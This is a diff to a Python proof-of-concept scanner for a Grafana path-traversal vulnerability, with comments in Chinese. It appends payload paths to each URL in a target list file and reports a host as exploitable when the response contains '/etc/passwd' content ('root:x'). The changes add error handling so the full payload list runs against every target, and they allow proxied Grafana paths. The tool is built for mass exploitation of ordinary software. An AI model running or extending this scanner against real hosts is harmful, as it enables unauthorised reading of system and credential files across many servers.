@@ -59,26 +59,28 @@ def grafana_vuln_poc(url):
     for pyload_data in pyload_lib:
         pyload = url + pyload_data
         request = urllib.request.Request(url=pyload, headers=headers)
-        requests = urllib.request.urlopen(request, timeout=3)
-        code = requests.getcode()
-        context = requests.read()
+        # 请求报错会导致不能完整跑完payload路径
+        try:
+            requests = urllib.request.urlopen(request, timeout=3)
+            code = requests.getcode()
+            context = requests.read()
 
-        if "root:x" in context.decode('utf-8') and code == 200:
-            print("*************************** 发现可利用的漏洞 ***************************")
-            print("Payload：" + pyload)
-            print("返回值：" + context.decode('utf-8')[:32])
-            vuln_url.append(url)
-            break # 只要有一个pyload测试成功，便执行下一个URL测试
+            if "root:x" in context.decode('utf-8') and code == 200:
+                print("*************************** 发现可利用的漏洞 ***************************")
+                print("Payload：" + pyload)
+                print("返回值：" + context.decode('utf-8')[:32])
+                vuln_url.append(url)
+                break # 只要有一个pyload测试成功，便执行下一个URL测试
+        except Exception as e:
+                print('...')
 
 if __name__ == '__main__':
 
-    with open("result-20211209001115.txt", "r", encoding="utf-8") as f:
+    with open("url_list_file.txt", "r", encoding="utf-8") as f:
         url_lib = f.readlines()
     for url_buf in url_lib:
-        if url_buf.replace("\n", "").split("/")[0] == "http:" or url_buf.replace("\n", "").split("/")[0] == "https:":
-            url = url_buf.replace("\n", "").split("/")[0] + "//" + url_buf.replace("\n", "").split("/")[2]
-        else:
-            url = "http://" + url_buf.replace("\n", "").split("/")[0]
+        # 可以测试有路径代理的情况，比如配置了route为 http://x.x.x.x/grafana ;要求url_list_file.txt文件最后不能有 / ;
+        url = url_buf.replace("\n", "")
 
         print("当前测试URL：" + url)
         try:
